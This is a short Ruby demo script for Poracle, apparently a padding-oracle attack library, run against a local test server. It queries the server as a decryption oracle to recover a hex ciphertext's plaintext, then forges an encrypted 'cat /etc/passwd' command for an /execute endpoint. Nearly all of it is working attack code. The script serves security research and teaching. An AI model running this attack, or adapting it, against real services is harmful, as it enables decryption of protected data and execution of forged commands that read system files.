##
# Demo.rb
# Created: February 10, 2013
# By: Ron Bowes
#
# A demo of how to use Poracle, that works against RemoteTestServer.
##
#
require 'httparty'
require './Poracle'

BLOCKSIZE = 16

poracle = PoracleDecryptor.new(BLOCKSIZE, true) do |data|
  url = "http://localhost:8080/execute/#{data.unpack("H*").pop}"
  result = HTTParty.get(url)
  result.parsed_response.force_encoding('ASCII-8BIT') !~ /Failed to decrypt/
end

result = poracle.decrypt(['7b6c179c04ba05dd54e8db9fe5790eb488ed79ef3d58f4361461d9c470340686071e8d11e7b5fd9410d9814c864c2f8f892726676e4f670ddc85244bed32398e7055d447fc2d38c04d6d4dfed1d2d552f55465e5d71dee3273b964a3cafd71fc'].pack('H*'), ['d11b12a22774581421e2bde33571b89a'].pack('H*'))
puts("-----------------------------")
puts("Decryption result")
puts("-----------------------------")
puts result
puts("-----------------------------")
puts()

result = poracle.encrypt('cat /etc/passwd')

blockcount = (result.length / BLOCKSIZE) + 1
blocks = result.unpack("a#{BLOCKSIZE}" * blockcount)

puts("-----------------------------")
puts("Result, if you control the IV:")
puts("-----------------------------")
puts("IV = %s" % blocks[0].unpack('H*'))
puts("Data = %s" % blocks[1..-1].join('').unpack('H*'))
puts()
puts("-----------------------------")
puts("Result, if you don't control the IV (note: will start with garbage):")
puts("-----------------------------")
puts(result.unpack('H*'))
